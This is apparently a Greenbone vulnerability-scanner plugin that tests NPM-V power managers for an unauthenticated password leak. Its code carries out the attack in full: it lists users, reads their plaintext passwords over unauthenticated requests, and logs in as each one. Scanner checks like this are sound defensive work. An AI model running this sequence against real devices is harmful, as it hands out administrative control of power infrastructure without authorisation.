if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.113036" );
	script_version( "2020-02-03T13:52:45+0000" );
	script_tag( name: "last_modification", value: "2020-02-03 13:52:45 +0000 (Mon, 03 Feb 2020)" );
	script_tag( name: "creation_date", value: "2017-10-19 10:00:00 +0200 (Thu, 19 Oct 2017)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "NPM-V Password Leak and Reset vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_goahead_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "embedthis/goahead/detected" );
	script_tag( name: "summary", value: "NPM-V 2.4.1 and before is vulnerable to Password Leak and Password Reset vulnerabilities." );
	script_tag( name: "vuldetect", value: "Tries to read a user's password from the web application and uses it attempt a login." );
	script_tag( name: "insight", value: "GET-Requests for reading and changing passwords and creating new users don't require authentication." );
	script_tag( name: "impact", value: "Successful exploitation would allow an attacker to get administrative access to the Network Power Manager." );
	script_tag( name: "affected", value: "NPM-V 2.4.1 and before." );
	script_tag( name: "solution", value: "Upgrade to NPM-V version 2.4.2." );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/42933/" );
	exit( 0 );
}
CPE = "cpe:/a:embedthis:goahead";
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
content = http_get_cache( port: port, item: "/user/user.html" );
if(!( ContainsString( content, "function loaddata()" ) && ContainsString( content, "function loadlist()" ) && ContainsString( content, "function deleteuser()" ) && ContainsString( content, "function userchange()" ) )){
	exit( 0 );
}
ip = get_host_ip();
hostname = get_host_name();
add_headers = make_array( "Cache-Control", "max-age=0", "Connection", "keep-alive", "Accept-Encoding", "gzip, deflate, sdch", "Accept-Language", "en-US,en;q=0.8", "Upgrade-Insecure-Requests", "1" );
req = http_get_req( port: port, url: "/userinfo", add_headers: add_headers, accept_header: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" );
req = ereg_replace( string: req, pattern: hostname, replace: ip, icase: TRUE );
res = http_keepalive_send_recv( port: port, data: req );
usernames = split( buffer: res, sep: "?", keep: FALSE );
for username in usernames {
	add_headers = make_array( "Cache-Control", "max-age=0", "Connection", "keep-alive", "Accept-Encoding", "gzip, deflate, sdch", "Accept-Language", "en-US,en;q=0.8", "Upgrade-Insecure-Requests", "1" );
	req = http_get_req( port: port, url: "/userlistinfo?id1=" + username, add_headers: add_headers, accept_header: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" );
	req = ereg_replace( string: req, pattern: hostname, replace: ip, icase: TRUE );
	res = http_keepalive_send_recv( port: port, data: req );
	if(!ContainsString( res, "?" )){
		continue;
	}
	userinfo = split( buffer: res, sep: "?", keep: FALSE );
	password = userinfo[1];
	if(!password){
		continue;
	}
	add_headers = make_array( "Cache-Control", "max-age=0", "Connection", "keep-alive", "Accept-Encoding", "gzip, deflate, sdch", "Accept-Language", "en-US,en;q=0.8", "Upgrade-Insecure-Requests", "1" );
	req = http_get_req( port: port, url: "/login?id1=" + username + "&id2=" + password, add_headers: add_headers, accept_header: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" );
	req = ereg_replace( string: req, pattern: hostname, replace: ip, icase: TRUE );
	res = http_keepalive_send_recv( port: port, data: req );
	if(ContainsString( res, "302 Found" ) && ContainsString( res, "Location: /home.html" )){
		if( !success_users ){
			success_users = username;
		}
		else {
			success_users = success_users + ", " + username;
		}
	}
}
if(success_users){
	report = "The script could successfully acquire credentials and use them to login for following users: " + success_users;
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

